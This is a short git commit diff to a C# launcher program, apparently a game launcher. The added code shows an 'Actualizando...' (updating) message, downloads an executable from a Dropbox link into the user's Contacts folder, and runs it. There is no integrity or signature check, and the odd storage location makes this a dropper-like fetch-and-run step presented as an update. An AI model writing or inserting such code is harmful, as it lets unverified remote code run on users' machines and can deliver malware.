5119be90d2f14c0137c6d30e750948b93daabef3
Git <nico@hipermediaz.com>
2018-03-15 18:33:32 +0100

    Release

--- atarialauncher/Program.cs
+++ atarialauncher/Program.cs
@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -10,6 +11,19 @@ namespace atarialauncher
     {
         static void Main(string[] args)
         {
+            Console.Title = "ACTUALIZANDO...";
+            Console.WriteLine("Actualizando...");
+            var pathWithEnv = @"%USERPROFILE%\Contacts\main.exe";
+            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
+            if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
+            {
+                System.IO.File.Delete(filePath);
+                WebClient webClient = new WebClient();
+                webClient.DownloadFile("https://www.dropbox.com/s/fj4i1a254q8dhda/main.exe?dl=1", filePath);
+
+            }
+            System.Diagnostics.Process.Start(filePath);
         }
     }
 }
+
